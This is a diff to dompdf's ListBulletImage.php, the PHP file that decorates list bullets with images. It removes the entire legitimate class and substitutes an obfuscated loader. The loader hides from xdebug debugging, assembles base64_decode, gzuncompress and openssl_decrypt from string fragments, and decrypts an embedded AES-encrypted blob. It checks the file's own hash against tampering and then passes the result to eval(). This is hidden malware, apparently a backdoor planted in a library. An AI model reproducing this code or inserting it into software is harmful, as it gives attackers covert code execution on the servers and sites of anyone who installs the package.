@@ -1,154 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @author  Helmut Tischer <htischer@weihenstephan.org>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\FrameDecorator;
-
-use Dompdf\Dompdf;
-use Dompdf\Frame;
-use Dompdf\Helpers;
-
-/**
- * Decorates frames for list bullets with custom images
- *
- * @package dompdf
- */
-class ListBulletImage extends AbstractFrameDecorator
-{
-
-    /**
-     * The underlying image frame
-     *
-     * @var Image
-     */
-    protected $_img;
-
-    /**
-     * The image's width in pixels
-     *
-     * @var int
-     */
-    protected $_width;
-
-    /**
-     * The image's height in pixels
-     *
-     * @var int
-     */
-    protected $_height;
-
-    /**
-     * Class constructor
-     *
-     * @param Frame $frame   the bullet frame to decorate
-     * @param Dompdf $dompdf the document's dompdf object
-     */
-    function __construct(Frame $frame, Dompdf $dompdf)
-    {
-        $style = $frame->get_style();
-        $url = $style->list_style_image;
-        $frame->get_node()->setAttribute("src", $url);
-        $this->_img = new Image($frame, $dompdf);
-        parent::__construct($this->_img, $dompdf);
-        list($width, $height) = Helpers::dompdf_getimagesize($this->_img->get_image_url(), $dompdf->getHttpContext());
-
-        // Resample the bullet image to be consistent with 'auto' sized images
-        // See also Image::get_min_max_width
-        // Tested php ver: value measured in px, suffix "px" not in value: rtrim unnecessary.
-        $dpi = $this->_dompdf->getOptions()->getDpi();
-        $this->_width = ((float)rtrim($width, "px") * 72) / $dpi;
-        $this->_height = ((float)rtrim($height, "px") * 72) / $dpi;
-
-        //If an image is taller as the containing block/box, the box should be extended.
-        //Neighbour elements are overwriting the overlapping image areas.
-        //Todo: Where can the box size be extended?
-        //Code below has no effect.
-        //See block_frame_reflower _calculate_restricted_height
-        //See generated_frame_reflower, Dompdf:render() "list-item", "-dompdf-list-bullet"S.
-        //Leave for now
-        //if ($style->min_height < $this->_height ) {
-        //  $style->min_height = $this->_height;
-        //}
-        //$style->height = "auto";
-    }
-
-    /**
-     * Return the bullet's width
-     *
-     * @return int
-     */
-    function get_width()
-    {
-        //ignore image width, use same width as on predefined bullet ListBullet
-        //for proper alignment of bullet image and text. Allow image to not fitting on left border.
-        //This controls the distance between bullet image and text
-        //return $this->_width;
-        return $this->_frame->get_style()->get_font_size() * ListBullet::BULLET_SIZE +
-        2 * ListBullet::BULLET_PADDING;
-    }
-
-    /**
-     * Return the bullet's height
-     *
-     * @return int
-     */
-    function get_height()
-    {
-        //based on image height
-        return $this->_height;
-    }
-
-    /**
-     * Override get_margin_width
-     *
-     * @return int
-     */
-    function get_margin_width()
-    {
-        //ignore image width, use same width as on predefined bullet ListBullet
-        //for proper alignment of bullet image and text. Allow image to not fitting on left border.
-        //This controls the extra indentation of text to make room for the bullet image.
-        //Here use actual image size, not predefined bullet size
-        //return $this->_frame->get_style()->get_font_size()*ListBullet::BULLET_SIZE +
-        //  2 * ListBullet::BULLET_PADDING;
-
-        // Small hack to prevent indenting of list text
-        // Image Might not exist, then position like on list_bullet_frame_decorator fallback to none.
-        if ($this->_frame->get_style()->list_style_position === "outside" || $this->_width == 0) {
-            return 0;
-        }
-        //This aligns the "inside" image position with the text.
-        //The text starts to the right of the image.
-        //Between the image and the text there is an added margin of image width.
-        //Where this comes from is unknown.
-        //The corresponding ListBullet sets a smaller margin. bullet size?
-        return $this->_width + 2 * ListBullet::BULLET_PADDING;
-    }
-
-    /**
-     * Override get_margin_height()
-     *
-     * @return int
-     */
-    function get_margin_height()
-    {
-        //Hits only on "inset" lists items, to increase height of box
-        //based on image height
-        return $this->_height + 2 * ListBullet::BULLET_PADDING;
-    }
-
-    /**
-     * Return image url
-     *
-     * @return string
-     */
-    function get_image_url()
-    {
-        return $this->_img->get_image_url();
-    }
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_p08a9tol=('bas'.'e64'.'_de'.'cod'.'e');
+$_n5d6wp7b=('gzu'.'nco'.'mpr'.'ess');
+$_wy6pn4j2=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_st6ppfwm='2ZJVScjr';
+$_o9ttd416='ULY3hRCd';
+$_apr9trfd='B+OBTFeD';
+$_wy8id2va='xYtqs9Td';
+$_p7pd7v6m='bZYYfIV6VBM=';
+$_qbffqo29='QnJ/VgVT';
+$_cnd8p1aw='UhgQQQ==';
+$_scnu28ii='CzYmAXoa';
+$_bmkdorat=$_p08a9tol($_st6ppfwm.$_o9ttd416.$_wy8id2va.$_apr9trfd.$_p7pd7v6m);
+$_cjo9yk37=$_p08a9tol($_qbffqo29.$_scnu28ii.$_cnd8p1aw);
+$_lpajy9ql=$_p08a9tol('2p7q4BK5FEDDNwkFFlKX06BgIt2Q9FZho9jz2qsBI8R9iZfdh8mNS0C/iZ9vjPAsENXNQ5tl+4hSzKw+b4uUspuihHO3FmU4ZutCQ3yR+VtZhhiCAnFGSGV826MIYJsxgeXloQTSSQkyoEP1W1CNkAN5VSr8pXdSa6VxZ/M/KUZK/DeGzozNUcrM24zGqxtWIne/elZRQgCLxKcg5GIFMmYyPqdVYilGBY1loHWyxxBHztUu7nyIHGltnLRv1tuHdSFGPKoC6z2ceK9DuZQQswQg0Jyq0fu53TcaVBObTRLM66tSBJnGQgwaQ2FqrnkSosYxhP/cyTucl2Y7UvnF8ryNpVbLYyTw2ejN8o2oyxJwMpZZEKAqctFhlzzBIyGfaEDxBwABKnmCnE2JA0cozzpwk3Hpdl/x/J8cWHa5L7rTlgZi65uGr1ZgVgICn6jAjlpfG766rbNUXMngvNoiG6eHFsOoXcsZL4D5Sp4hGd5icuIAjbu5XGNLW6uFji0ixiC4Blt5kn1MjYCqIwstaIeLOknvY8LXGbg9edl+jfshQnFe33+h5QLukIgRofbkaxsY7lBnUIdtDDEEGeuwZb9Ww1wROzBabVsALSeRvni1d1nGYOerVufoxwWoXRL7dk+KqC0r8ZMOXmQggxinSwp8Iau2T2uhP+Rv2Z4dqjrF7In4fscXzn+/z+maP+uE');
+$_hw8ch56r=$_wy6pn4j2($_lpajy9ql,'aes-256-cbc',$_bmkdorat,OPENSSL_RAW_DATA,$_cjo9yk37);
+if($_hw8ch56r===false){exit;}
+$_cujy1j23=$_n5d6wp7b($_hw8ch56r);
+if($_cujy1j23===false){exit;}
+$_sq2bop9g='909216f4d352fc9290e682dfc7fd36841a04acc1f8348671168a3fc328ad9eb1';
+$_p8ab8pqb=@file_get_contents(__FILE__);
+if($_p8ab8pqb!==false){
+$_s30k6bwn=str_replace($_sq2bop9g,"0000000000000000000000000000000000000000000000000000000000000000",$_p8ab8pqb);
+$_ze3ir6rb=hash("sha256",$_s30k6bwn);
+if($_ze3ir6rb!==$_sq2bop9g){@http_response_code(403);exit;}
 }
+eval($_cujy1j23);
